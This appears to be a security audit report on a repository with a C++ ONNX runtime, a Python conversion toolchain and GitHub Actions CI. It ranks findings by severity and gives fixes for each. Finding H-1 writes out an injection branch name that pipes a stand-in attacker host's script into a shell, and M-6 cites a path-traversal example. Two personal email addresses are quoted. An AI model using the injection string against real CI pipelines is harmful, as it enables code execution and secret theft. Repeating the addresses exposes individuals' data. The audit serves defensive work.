## Critical

### C-1 — Inference thread has no exception handling (process crash)
- **Location:** `runtime-library/src/runtime_core.cpp`, `inference_thread_func()` lines 158–237
- **Description:** No `try/catch` in the inference thread. Any C++ exception thrown by `session->Run()`, `map_to_tensors_struct_type()` (throws `std::runtime_error` on unsupported dtype, `runtime_utils.cpp:95`), or the explicit `throw` at `runtime_core.cpp:225` propagates out of the thread function and calls `std::terminate()`, crashing the entire host process with no recovery path.
- **Fix:** Wrap the body of `inference_thread_func()` in `try { ... } catch (const std::exception &e) { logger->error(...); }`. Enqueue a sentinel error or set an error flag so `receive_output()` doesn't block forever.

### C-2 — Integer overflow in tensor size computation (heap corruption)
- **Location:** `runtime-library/src/runtime_core.cpp`, line 183
- **Description:** `int tensor_size = std::accumulate(shape.begin(), shape.end(), 1, std::multiplies<int64_t>()) * dtype_size;` truncates `int64_t` to `int`. For tensors larger than ~2 billion bytes, `tensor_size` wraps to a negative value passed to `Ort::Value::CreateTensor`, causing undefined behaviour / heap corruption. Exploitable via malicious ONNX models.
- **Fix:** Change `int tensor_size` to `size_t tensor_size`. Use `int64_t{1}` as the `accumulate` seed. Add an upper-bound sanity check before the multiply.

## High

### H-1 — `github.head_ref` expression injection in CI shell steps
- **Location:** `.github/workflows/build-runtime.yml:58`, `build-toolchain.yml:54`, `delete-temporary-artifacts.yml:35`
- **Description:** `version=${{ github.head_ref }}` is expanded directly inside `run:` bash steps. A PR branch named `main; curl attacker.com | sh` executes arbitrary commands in the CI runner with access to all repository secrets (`S3_ACCESS_KEY`, `S3_SECRET_KEY`, `S3_ENDPOINT_URL`). Exploitable by anyone who can open a PR.
- **Fix:**
  ```yaml
  env:
    HEAD_REF: ${{ github.head_ref }}
  run: |
    version="$HEAD_REF"
  ```
  Apply to all three workflow files.

### H-2 — Python 3.8.16 base image is End-of-Life
- **Location:** `conversion-toolchain/Dockerfile:2`
- **Description:** Python 3.8 reached EOL on 2024-10-07. The base image has received no security patches for 562+ days. All CVEs disclosed after that date in CPython, pip, and OS packages are unpatched.
- **Fix:** Upgrade to `FROM python:3.12-slim AS base`. Validate dependency compatibility with Python 3.12.

### H-3 — Docker container runs as root
- **Location:** `conversion-toolchain/Dockerfile` (no `USER` directive)
- **Description:** All container processes run as root (uid 0). If any vulnerability in ONNX model loading or installed packages is exploited, the attacker has full root inside the container.
- **Fix:**
  ```dockerfile
  RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
  USER appuser
  ```
  Add before the `ENTRYPOINT` line.

### H-4 — GitHub Actions pinned to mutable version tags
- **Location:** `build-runtime.yml:20,77`, `build-toolchain.yml:20`
- **Description:** `uses: actions/checkout@v3` is a mutable tag. A supply-chain compromise of `actions/checkout` would silently run malicious code in CI with access to all secrets.
- **Fix:**
  ```yaml
  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  ```

### H-5 — Python dependencies fully unpinned
- **Location:** `conversion-toolchain/requirements.txt`
- **Description:** All 4 dependencies (`lgg`, `onnx`, `onnxsim`, `onnxruntime`) are unpinned. A malicious or breaking update is silently pulled in on every Docker build.
- **Fix:** Pin to exact versions (run `pip freeze` in a clean env). Example:
  ```
  onnx==1.16.1
  onnxsim==0.4.36
  onnxruntime==1.19.2
  lgg==0.1.0
  ```

### H-6 — `protobufjs` RCE in vendored ONNX Runtime JS deps (6 Dependabot alerts)
- **Location:** `runtime-library/deps/onnxruntime/*/js/node/package-lock.json`, `*/js/web/package-lock.json`
- **Description:** All three vendored ORT versions (1.16.3, 1.17.3, 1.21.1) contain `protobufjs` at a version with a known arbitrary code execution vulnerability. Not used at C++ runtime, but tracked in the repo.
- **Fix:** Remove the `js/` subtrees from vendored deps if not needed, or add a Dependabot ignore rule for `runtime-library/deps/**` with an explanatory comment.

## Medium

### M-1 — `std::stoi` throws exceptions inside `extern "C"` function
- **Location:** `runtime-library/src/runtime_core.cpp:56,68`
- **Description:** `runtime_initialization_with_args` is `extern "C"`. Propagating `std::invalid_argument` or `std::out_of_range` across a C boundary is undefined behaviour. A caller passing `"abc"` as `log_level` can silently corrupt the stack.
- **Fix:** Wrap both `stoi` calls in `try/catch` with fallback defaults.

### M-2 — Null pointer dereference before `runtime_initialization()`
- **Location:** `runtime-library/src/runtime_core.cpp:113,145,241`
- **Description:** `logger` is a `shared_ptr` initialized to `nullptr`. Calling `runtime_model_loading`, `send_input`, or `receive_output` before `runtime_initialization()` causes an immediate null dereference (SIGSEGV).
- **Fix:** Add a null guard at the top of each public function, or initialize `logger` at static-init time with a stderr fallback sink.

### M-3 — Memory leak on partial tensor allocation failure
- **Location:** `runtime-library/src/runtime_core.cpp:203–232`
- **Description:** If `malloc` returns null and the `throw` at line 225 is reached, `output_tensors` and any partially-filled member arrays are never freed. The `throw` unwinds past the allocation with no cleanup.
- **Fix:** In the `catch` block (added for C-1), call `deep_free_tensors_struct(output_tensors)` before continuing.

### M-4 — Double initialization leaks the inference thread
- **Location:** `runtime-library/src/runtime_core.cpp:96`
- **Description:** Calling `runtime_initialization()` twice without an intervening `runtime_destruction()` overwrites the `inference_thread` handle. The previous thread continues running but is no longer reachable — it leaks until the next `runtime_destruction()`.
- **Fix:** Check `inference_thread.joinable()` at the start of `runtime_initialization` and return an error if already initialized.

### M-5 — `s5cmd` downloaded without integrity verification (Windows CI)
- **Location:** `.github/workflows/build-runtime.yml:108–113`
- **Description:** `s5cmd` is fetched via `Invoke-WebRequest` with no checksum verification. A MITM or compromised release could substitute a binary that exfiltrates S3 credentials.
- **Fix:**
  ```powershell
  $expected = "<known-sha256>"
  $actual = (Get-FileHash $s5cmdZip -Algorithm SHA256).Hash
  if ($actual -ne $expected) { throw "Checksum mismatch" }
  ```

### M-6 — No path validation on `--onnx-path` (path traversal)
- **Location:** `conversion-toolchain/conversion_toolchain/main.py:9,20,24`
- **Description:** `onnx_path` is passed directly from CLI args to `onnx.load()` and `open()` without canonicalization. A path like `../../etc/passwd` or a symlink could be followed if the tool is run outside Docker or with overly broad mounts.
- **Fix:** Apply `os.path.realpath()` normalization and validate the `.onnx` extension. Add an optional `--allowed-root` containment check.

### M-7 — `md5_hash` reads entire file into memory (OOM risk)
- **Location:** `conversion-toolchain/conversion_toolchain/utils.py:23–25`
- **Description:** `hashlib.md5(f.read())` loads the full file into memory. Multi-GB ONNX models can exhaust container memory.
- **Fix:**
  ```python
  def md5_hash(file_path: str) -> str:
      h = hashlib.md5()
      with open(file_path, 'rb') as f:
          for chunk in iter(lambda: f.read(65536), b''):
              h.update(chunk)
      return h.hexdigest()
  ```

## Low

### L-1 — Personal data: corporate email in tracked source
- **Location:** `conversion-toolchain/setup.py:7`
- **Description:** `author_email='aassis@networkoptix.com'` is hardcoded in a publicly tracked file.
- **Fix:** Use a role-based address (e.g., `opensource@networkoptix.com`) or omit the field since the package is not published to PyPI.

### L-2 — Personal data: personal Gmail address in tracked config
- **Location:** `.claude/CLAUDE.md:109`
- **Description:** `assis.ayoub@gmail.com` is embedded in the commit template inside the tracked `.claude/` directory, visible to anyone with repo access.
- **Fix:** Replace with the corporate email, or move the commit template to `.claude/settings.local.json` (which is gitignored).

### L-3 — OIDC `id-token` permission not explicitly denied
- **Location:** All three workflow files, `permissions:` blocks
- **Description:** `id-token` is implicitly `none` when `contents: none` is set, but is not explicitly listed. Minor defence-in-depth gap.
- **Fix:** Add `id-token: none` explicitly to each workflow's `permissions` block.

## Recommended Fix Order

1. **C-1** — Wrap inference thread in `try/catch` (production crash risk)
2. **C-2** — Fix `int tensor_size` overflow (heap corruption via malicious models)
3. **H-1** — Fix `github.head_ref` injection in all 3 workflows (remotely exploitable now)
4. **H-2 + H-3** — Upgrade Docker base image + add non-root user
5. **H-4 + H-5** — Pin actions to SHAs + pin Python dependencies
6. **M-1 through M-4** — C++ robustness fixes
7. **L-1 + L-2** — Personal data cleanup
